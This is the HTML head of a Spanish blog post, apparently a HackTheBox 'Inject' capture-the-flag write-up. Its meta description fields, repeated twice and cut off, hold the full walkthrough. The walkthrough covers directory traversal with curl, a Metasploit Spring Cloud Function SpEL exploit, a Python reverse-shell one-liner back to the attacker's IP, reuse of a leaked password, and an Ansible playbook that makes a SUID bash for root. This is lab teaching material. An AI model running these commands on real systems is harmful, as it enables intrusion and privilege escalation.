@@ -1,0 +1,3534 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html lang="es-ES"
+  
+>
+
+  <!--
+  The Head
+-->
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <!-- Allow having a localized datetime different from the appearance language -->
+  
+
+  
+
+    
+
+    
+
+  
+
+  
+
+  
+    
+
+    
+      
+        <!-- `site.img_cdn` is a local file path -->
+        
+        
+      
+
+      
+
+    
+      
+        <!-- `site.img_cdn` is a local file path -->
+        
+        
+      
+
+      
+
+    
+  
+
+  
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.3.1" />
+<meta property="og:title" content="Inject WriteUp" />
+<meta name="author" content="H4ckerLite" />
+<meta property="og:locale" content="es_ES" />
+<meta name="description" content="Imortante Está máquina esta en Release Arena(actualmemte Open Beta Season), por lo que la IP es de una instancia privada. Les explicaré cómo compremeter la máquina Inject de hackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de tipo Directory Transversal*, usando dicha vulnerabilidad veremos una version vulnerable de Spring que cuenta con una vulnerabilidad de tipo **RCE. Para migrar de usuario nos aprovecharemos de una contrasena filtrada. Para escalar nuestros privilegios usaremos playbook. Identificando el O.S Enviando trazas ICMP(Internet Control Message Protocol) y usando el TTL(Time to Live) podemos ver identificar el OS. 1 2 3 4 5 6 7 ❯ ping -c1 10.129.178.241 PING 10.129.178.241 (10.129.178.241) 56(84) bytes of data. 64 bytes from 10.129.178.241: icmp_seq=1 ttl=63 time=214 ms --- 10.129.178.241 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 214.029/214.029/214.029/0.000 ms Vemos lo siguiente: TTL El TTL es 63, esto indica que es una máquina Linux, ya que dichas mæquinas cuentan con un TTL igual a 64, pero…..porqué aparece como 63 e infiero que es Linux. bueno nuestra conexión no es directa, pasa por un nodo intermedario y eso hace que el TTL disminuya en una unidad. Analizando la WEB Web Error Si entramos veremos un mensaje de que no se puede acceder, así que sabemos que el puerto HTTP está corriendo en otro puerto, realizamos un escaneo NMAP. ##Escaneo NMAP realizaremos el escaneo para saber que purtos están abierto y además para ver por donde corre el HTTP. 1 2 3 4 5 6 7 8 9 10 ❯ nmap 10.129.178.241 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 12:33 -04 Nmap scan report for 10.129.178.241 Host is up (0.23s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds Corre por el puerto 8080, ahora podemos ver la web correctamente. _Web Error Detectando posibles métodos de intrución Vemos un Login, lo cual podemos crear una cuanta y probar cosas pero no existe dicho archiv, y vemos un Sing Up existe, podemos probar injeciones SQL y NoSQL pero nos redirige a una página que nos induca que esta en construcción. Enumerando Directorios Usando WFUZZ veremos algunos directorios importantes 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.178.241:8080/FUZZ 2&gt;/dev/null ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.129.178.241:8080/FUZZ Total requests: 220547 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000153: 200 112 L 326 W 5371 Ch &quot;blogs&quot; 000000051: 200 103 L 194 W 5654 Ch &quot;register&quot; 000000352: 200 53 L 107 W 1857 Ch &quot;upload&quot; 000001097: 500 0 L 27 W 712 Ch &quot;environment&quot; 000002694: 500 0 L 3 W 106 Ch &quot;error&quot; 000008675: 200 33 L 77 W 1086 Ch &quot;release_notes&quot; 000022957: 400 0 L 32 W 431 Ch &quot;http%3A%2F%2Fwww&quot; 000045226: 200 165 L 487 W 6657 Ch &quot;http://10.129.178.241:8080/&quot; ^C Total time: 267.0736 Processed Requests: 48259 Filtered Requests: 48251 Requests/sec.: 180.6954 La carpera /upload nos llama la atención, ingresamos a ella y podemos ver que nos dejan subir archivos Upload Si suvimos una reverse shell de PHP nos dice que solo adminte imagenes, subimos una imagen random y meremos resultados. Imagen entramos a ver la imagen y …..mmmm img?= eso huele a Directory Transversal.Podemos probar ver el /etc/passwd ingresamos la cadena Directory Transversal 1 ../../../../../../../../../../../../../../../../etc/passwd Pero no vemos nada, podemos probar con burp o curl, interceptamos la petición y la mandamos al repeater. Burpsuite Analizando mas a fondo la web podemos intentar listar la carppeta donde se guardan las paginas web /var/www/ 1 2 3 ❯ curl &#39;http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/&#39; html WebApp la careta WebApp nos llama la atención podemos listar su contenido 1 2 3 4 5 6 7 8 9 10 11 12 ❯ curl &#39;http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/WebApp&#39; .classpath .DS_Store .idea .project .settings HELP.md mvnw mvnw.cmd pom.xml src target Un archivo .xml, lo leemos. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 ❯ curl &#39;http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/WebApp/pom.xml&#39; &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.6.5&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.example&lt;/groupId&gt; &lt;artifactId&gt;WebApp&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;name&gt;WebApp&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;11&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.sun.activation&lt;/groupId&gt; &lt;artifactId&gt;javax.activation&lt;/artifactId&gt; &lt;version&gt;1.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt; &lt;version&gt;3.2.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.webjars&lt;/groupId&gt; &lt;artifactId&gt;bootstrap&lt;/artifactId&gt; &lt;version&gt;5.1.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.webjars&lt;/groupId&gt; &lt;artifactId&gt;webjars-locator-core&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;version&gt;${parent.version}&lt;/version&gt; &lt;/plugin&gt; &lt;/plugin&gt; &lt;finalName&gt;spring-webapp&lt;/finalName&gt; &lt;/build&gt; &lt;/project&gt; Viendo algunas versiones nos encontranos con Spring Cloud Function Web, buscando CVE nos encontramos que es vulnerable a SpEL Explotación Explotación manual En Proceso… Explotación con MetaSploit Nos abrimos metasploit 1 msfconsole Usando de apoyo este foro nos guiaremos.Una vez dentro de metasploit haremos lo siguiente. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 [msf](Jobs:0 Agents:0) &gt;&gt; use exploit/multi/http/spring_cloud_function_spel_injection [*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp [msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; set RHOST 10.129.178.241 RHOST =&gt; 10.129.178.241 [msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; set LHOST 10.10.14.170 LHOST =&gt; 10.10.14.170 [msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; run [*] Started reverse TCP handler on 10.10.14.170:4444 [*] Running automatic check (&quot;set AutoCheck false&quot; to disable) [!] The service is running, but could not be validated. [*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp [*] Command Stager progress - 100.00% done (823/823 bytes) [*] Sending stage (3045348 bytes) to 10.129.178.241 [*] Meterpreter session 1 opened (10.10.14.170:4444 -&gt; 10.129.178.241:43644) at 2023-03-12 21:25:11 -0400 (Meterpreter 1)(/) &gt; shell Process 76003 created. Channel 1 created. whoami &amp;&amp; id frank uid=1000(frank) gid=1000(frank) groups=1000(frank) Ahora para mayor comodidad nos pasaremos esa shell mediante reverse shell, comprobamos si esta python3 y efectivamente esta instalado. export RHOST=”10.10.14.170”;export RPORT=443;python3 -c ‘import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(“RHOST”),int(os.getenv(“RPORT”))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(“bash”)’ 1 2 3 4 5 6 7 En nuestra máquina nos ponemos en escucha por el puerto 443 y nos debe llegar. ```bash ❯ nc -lvnp 443 listening on [any] 443 ... connect to [10.10.14.170] from (UNKNOWN) [10.129.178.241] 48474 frank@inject:/$ Aplicamos tratamiento a la TTY Migraciñon de usuario En la carpeta personal del usuario listamos carpetas escondidad 1 2 3 frank@inject:~$ ls -a . .. .bash_history .bashrc .cache .local .m2 .profile frank@inject:~$ la carpeta .m2 nos llama la atención, listamos su contenido 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 frank@inject:~$ ls .m2 settings.xml frank@inject:~$ cat .m2/* &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;settings xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;servers&gt; &lt;server&gt; &lt;id&gt;Inject&lt;/id&gt; &lt;username&gt;phil&lt;/username&gt; &lt;password&gt;DocPhillovestoInject123&lt;/password&gt; &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt; &lt;filePermissions&gt;660&lt;/filePermissions&gt; &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt; &lt;configuration&gt;&lt;/configuration&gt; &lt;/server&gt; &lt;/servers&gt; &lt;/settings&gt; frank@inject:~$ Vemos la contraseña del usuario phil, migramos… 1 2 3 frank@inject:~$ su phil Password:DocPhillovestoInject123 phil@inject:/home/frank$ …en su carpeta personal procedemos a leer la primera flag. 1 2 3 4 phil@inject:~$ cat user.txt be****************************36 phil@inject:~$ Escalada de Privilegios No encontramos ningun binario SUID o permiso sudo, pero si si vemos a los grupos que pertenecemos vemos un grupo extraño staff. 1 2 3 phil@inject:~$ id uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff) phil@inject:~$ Si listamos si tenemos capacidad para dicho grupo nos encontramos con estó. 1 2 3 4 phil@inject:~$ find / -group staff -print 2&gt;/dev/null /opt/automation/tasks /root /var/local La ruta /opt/automation/tasks nos llama la atención. ```phil@inject:~$ ls /opt/automation/tasks/ playbook_1.yml phil@inject:~$ 1 2 3 4 5 6 7 8 Si miramos el archivo se modificó recientemente, por lo cual puede que exista una tarea cron.Si volvemos a volver a checkear el archivo se modifico 2 minutos después. ```bash phil@inject:/opt/automation/tasks$ ls -lah total 12K drwxrwxr-x 2 root staff 4.0K Mar 13 01:46 . drwxr-xr-x 3 root root 4.0K Oct 20 04:23 .. -rw-r--r-- 1 root root 150 Mar 13 01:46 playbook_1.yml phil@inject:/opt/automation/tasks$ Un archivo .YML buscamos en internet el nombre del arvhivo “playbook”. Buscando en internet nos encotramos con este blog que nos lleva a un archivo de github. Creamos un archivo shell.yml con el siguiente contenido. Esto copiara la bash en y la convertirá en SUID y podemos spawnear una shell como root. 1 2 3 4 5 6 7 8 --- - name: shell hosts: localhost become: yes tasks: - name: hack shell: &quot;cp /bin/bash . &amp;&amp; chmod +sx bash&quot; Una vez pasado los 2 minutos spawneamos la shell como root con: 1 2 /usr/bin/ansible-playbook shell.yml ./bash -p Hurra!!!! somos root, procedemos a leer la flag del usuario root 1 2 3 bash-5.0# cat root.txt 4e****************************67 bash-5.0# Máquina Pwneada, sigue así muchacho." />
+<meta property="og:description" content="Imortante Está máquina esta en Release Arena(actualmemte Open Beta Season), por lo que la IP es de una instancia privada. Les explicaré cómo compremeter la máquina Inject de hackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de tipo Directory Transversal*, usando dicha vulnerabilidad veremos una version vulnerable de Spring que cuenta con una vulnerabilidad de tipo **RCE. Para migrar de usuario nos aprovecharemos de una contrasena filtrada. Para escalar nuestros privilegios usaremos playbook. Identificando el O.S Enviando trazas ICMP(Internet Control Message Protocol) y usando el TTL(Time to Live) podemos ver identificar el OS. 1 2 3 4 5 6 7 ❯ ping -c1 10.129.178.241 PING 10.129.178.241 (10.129.178.241) 56(84) bytes of data. 64 bytes from 10.129.178.241: icmp_seq=1 ttl=63 time=214 ms --- 10.129.178.241 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 214.029/214.029/214.029/0.000 ms Vemos lo siguiente: TTL El TTL es 63, esto indica que es una máquina Linux, ya que dichas mæquinas cuentan con un TTL igual a 64, pero…..porqué aparece como 63 e infiero que es Linux. bueno nuestra conexión no es directa, pasa por un nodo intermedario y eso hace que el TTL disminuya en una unidad. Analizando la WEB Web Error Si entramos veremos un mensaje de que no se puede acceder, así que sabemos que el puerto HTTP está corriendo en otro puerto, realizamos un escaneo NMAP. ##Escaneo NMAP realizaremos el escaneo para saber que purtos están abierto y además para ver por donde corre el HTTP. 1 2 3 4 5 6 7 8 9 10 ❯ nmap 10.129.178.241 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 12:33 -04 Nmap scan report for 10.129.178.241 Host is up (0.23s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds Corre por el puerto 8080, ahora podemos ver la web correctamente. _Web Error Detectando posibles métodos de intrución Vemos un Login, lo cual podemos crear una cuanta y probar cosas pero no existe dicho archiv, y vemos un Sing Up existe, podemos probar injeciones SQL y NoSQL pero nos redirige a una página que nos induca que esta en construcción. Enumerando Directorios Usando WFUZZ veremos algunos directorios importantes 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.178.241:8080/FUZZ 2&gt;/dev/null ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.129.178.241:8080/FUZZ Total requests: 220547 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000153: 200 112 L 326 W 5371 Ch &quot;blogs&quot; 000000051: 200 103 L 194 W 5654 Ch &quot;register&quot; 000000352: 200 53 L 107 W 1857 Ch &quot;upload&quot; 000001097: 500 0 L 27 W 712 Ch &quot;environment&quot; 000002694: 500 0 L 3 W 106 Ch &quot;error&quot; 000008675: 200 33 L 77 W 1086 Ch &quot;release_notes&quot; 000022957: 400 0 L 32 W 431 Ch &quot;http%3A%2F%2Fwww&quot; 000045226: 200 165 L 487 W 6657 Ch &quot;http://10.129.178.241:8080/&quot; ^C Total time: 267.0736 Processed Requests: 48259 Filtered Requests: 48251 Requests/sec.: 180.6954 La carpera /upload nos llama la atención, ingresamos a ella y podemos ver que nos dejan subir archivos Upload Si suvimos una reverse shell de PHP nos dice que solo adminte imagenes, subimos una imagen random y meremos resultados. Imagen entramos a ver la imagen y …..mmmm img?= eso huele a Directory Transversal.Podemos probar ver el /etc/passwd ingresamos la cadena Directory Transversal 1 ../../../../../../../../../../../../../../../../etc/passwd Pero no vemos nada, podemos probar con burp o curl, interceptamos la petición y la mandamos al repeater. Burpsuite Analizando mas a fondo la web podemos intentar listar la carppeta donde se guardan las paginas web /var/www/ 1 2 3 ❯ curl &#39;http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/&#39; html WebApp la careta WebApp nos llama la atención podemos listar su contenido 1 2 3 4 5 6 7 8 9 10 11 12 ❯ curl &#39;http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/WebApp&#39; .classpath .DS_Store .idea .project .settings HELP.md mvnw mvnw.cmd pom.xml src target Un archivo .xml, lo leemos. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 ❯ curl &#39;http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/WebApp/pom.xml&#39; &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.6.5&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.example&lt;/groupId&gt; &lt;artifactId&gt;WebApp&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;name&gt;WebApp&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;11&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.sun.activation&lt;/groupId&gt; &lt;artifactId&gt;javax.activation&lt;/artifactId&gt; &lt;version&gt;1.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt; &lt;version&gt;3.2.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.webjars&lt;/groupId&gt; &lt;artifactId&gt;bootstrap&lt;/artifactId&gt; &lt;version&gt;5.1.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.webjars&lt;/groupId&gt; &lt;artifactId&gt;webjars-locator-core&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;version&gt;${parent.version}&lt;/version&gt; &lt;/plugin&gt; &lt;/plugin&gt; &lt;finalName&gt;spring-webapp&lt;/finalName&gt; &lt;/build&gt; &lt;/project&gt; Viendo algunas versiones nos encontranos con Spring Cloud Function Web, buscando CVE nos encontramos que es vulnerable a SpEL Explotación Explotación manual En Proceso… Explotación con MetaSploit Nos abrimos metasploit 1 msfconsole Usando de apoyo este foro nos guiaremos.Una vez dentro de metasploit haremos lo siguiente. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 [msf](Jobs:0 Agents:0) &gt;&gt; use exploit/multi/http/spring_cloud_function_spel_injection [*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp [msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; set RHOST 10.129.178.241 RHOST =&gt; 10.129.178.241 [msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; set LHOST 10.10.14.170 LHOST =&gt; 10.10.14.170 [msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; run [*] Started reverse TCP handler on 10.10.14.170:4444 [*] Running automatic check (&quot;set AutoCheck false&quot; to disable) [!] The service is running, but could not be validated. [*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp [*] Command Stager progress - 100.00% done (823/823 bytes) [*] Sending stage (3045348 bytes) to 10.129.178.241 [*] Meterpreter session 1 opened (10.10.14.170:4444 -&gt; 10.129.178.241:43644) at 2023-03-12 21:25:11 -0400 (Meterpreter 1)(/) &gt; shell Process 76003 created. Channel 1 created. whoami &amp;&amp; id frank uid=1000(frank) gid=1000(frank) groups=1000(frank) Ahora para mayor comodidad nos pasaremos esa shell mediante reverse shell, comprobamos si esta python3 y efectivamente esta instalado. export RHOST=”10.10.14.170”;export RPORT=443;python3 -c ‘import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(“RHOST”),int(os.getenv(“RPORT”))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(“bash”)’ 1 2 3 4 5 6 7 En nuestra máquina nos ponemos en escucha por el puerto 443 y nos debe llegar. ```bash ❯ nc -lvnp 443 listening on [any] 443 ... connect to [10.10.14.170] from (UNKNOWN) [10.129.178.241] 48474 frank@inject:/$ Aplicamos tratamiento a la TTY Migraciñon de usuario En la carpeta personal del usuario listamos carpetas escondidad 1 2 3 frank@inject:~$ ls -a . .. .bash_history .bashrc .cache .local .m2 .profile frank@inject:~$ la carpeta .m2 nos llama la atención, listamos su contenido 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 frank@inject:~$ ls .m2 settings.xml frank@inject:~$ cat .m2/* &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;settings xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;servers&gt; &lt;server&gt; &lt;id&gt;Inject&lt;/id&gt; &lt;username&gt;phil&lt;/username&gt; &lt;password&gt;DocPhillovestoInject123&lt;/password&gt; &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt; &lt;filePermissions&gt;660&lt;/filePermissions&gt; &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt; &lt;configuration&gt;&lt;/configuration&gt; &lt;/server&gt; &lt;/servers&gt; &lt;/settings&gt; frank@inject:~$ Vemos la contraseña del usuario phil, migramos… 1 2 3 frank@inject:~$ su phil Password:DocPhillovestoInject123 phil@inject:/home/frank$ …en su carpeta personal procedemos a leer la primera flag. 1 2 3 4 phil@inject:~$ cat user.txt be****************************36 phil@inject:~$ Escalada de Privilegios No encontramos ningun binario SUID o permiso sudo, pero si si vemos a los grupos que pertenecemos vemos un grupo extraño staff. 1 2 3 phil@inject:~$ id uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff) phil@inject:~$ Si listamos si tenemos capacidad para dicho grupo nos encontramos con estó. 1 2 3 4 phil@inject:~$ find / -group staff -print 2&gt;/dev/null /opt/automation/tasks /root /var/local La ruta /opt/automation/tasks nos llama la atención. ```phil@inject:~$ ls /opt/automation/tasks/ playbook_1.yml phil@inject:~$ 1 2 3 4 5 6 7 8 Si miramos el archivo se modificó recientemente, por lo cual puede que exista una tarea cron.Si volvemos a volver a checkear el archivo se modifico 2 minutos después. ```bash phil@inject:/opt/automation/tasks$ ls -lah total 12K drwxrwxr-x 2 root staff 4.0K Mar 13 01:46 . drwxr-xr-x 3 root root 4.0K Oct 20 04:23 .. -rw-r--r-- 1 root root 150 Mar 13 01:46 playbook_1.yml phil@inject:/opt/automation/tasks$ Un archivo .YML buscamos en internet el nombre del arvhivo “playbook”. Buscando en internet nos encotramos con este blog que nos lleva a un archivo de github. Creamos un archivo shell.yml con el siguiente contenido. Esto copiara la bash en y la convertirá en SUID y podemos spawnear una shell como root. 1 2 3 4 5 6 7 8 --- - name: shell hosts: localhost become: yes tasks: - name: hack shell: &quot;cp /bin/bash . &amp;&amp; chmod +sx bash&quot; Una vez pasado los 2 minutos spawneamos la shell como root con: 1 2 /usr/bin/ansible-playbook shell.yml ./bash -p Hurra!!!! somos root, procedemos a leer la flag del usuario root 1 2 3 bash-5.0# cat root.txt 4e****************************67 bash-5.0# Máquina Pwneada, sigue así muchacho." />
+<link rel="canonical" href="http://localhost:4000/posts/inject-writeup/" />
+<meta property="og:url" content="http://localhost:4000/posts/inject-writeup/" />
+<meta property="og:site_name" content="H4ckerLite Blog" />
+<meta property="og:image" content="http://localhost:4000/assets/img/commons/inject-writeup/Inject.png" />
+<meta property="og:image:alt" content="Inject WriteUp" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-03-11T17:00:00+01:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/img/commons/inject-writeup/Inject.png" />
+<meta name="twitter:image:alt" content="Inject WriteUp" />
+<meta property="twitter:title" content="Inject WriteUp" />
+<meta name="twitter:site" content="@mortzelo" />
+<meta name="twitter:creator" content="@H4ckerLite" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H4ckerLite"},"dateModified":"2023-03-11T17:00:00+01:00","datePublished":"2023-03-11T17:00:00+01:00","description":"Imortante Está máquina esta en Release Arena(actualmemte Open Beta Season), por lo que la IP es de una instancia privada. Les explicaré cómo compremeter la máquina Inject de hackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de tipo Directory Transversal*, usando dicha vulnerabilidad veremos una version vulnerable de Spring que cuenta con una vulnerabilidad de tipo **RCE. Para migrar de usuario nos aprovecharemos de una contrasena filtrada. Para escalar nuestros privilegios usaremos playbook. Identificando el O.S Enviando trazas ICMP(Internet Control Message Protocol) y usando el TTL(Time to Live) podemos ver identificar el OS. 1 2 3 4 5 6 7 ❯ ping -c1 10.129.178.241 PING 10.129.178.241 (10.129.178.241) 56(84) bytes of data. 64 bytes from 10.129.178.241: icmp_seq=1 ttl=63 time=214 ms --- 10.129.178.241 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 214.029/214.029/214.029/0.000 ms Vemos lo siguiente: TTL El TTL es 63, esto indica que es una máquina Linux, ya que dichas mæquinas cuentan con un TTL igual a 64, pero…..porqué aparece como 63 e infiero que es Linux. bueno nuestra conexión no es directa, pasa por un nodo intermedario y eso hace que el TTL disminuya en una unidad. Analizando la WEB Web Error Si entramos veremos un mensaje de que no se puede acceder, así que sabemos que el puerto HTTP está corriendo en otro puerto, realizamos un escaneo NMAP. ##Escaneo NMAP realizaremos el escaneo para saber que purtos están abierto y además para ver por donde corre el HTTP. 1 2 3 4 5 6 7 8 9 10 ❯ nmap 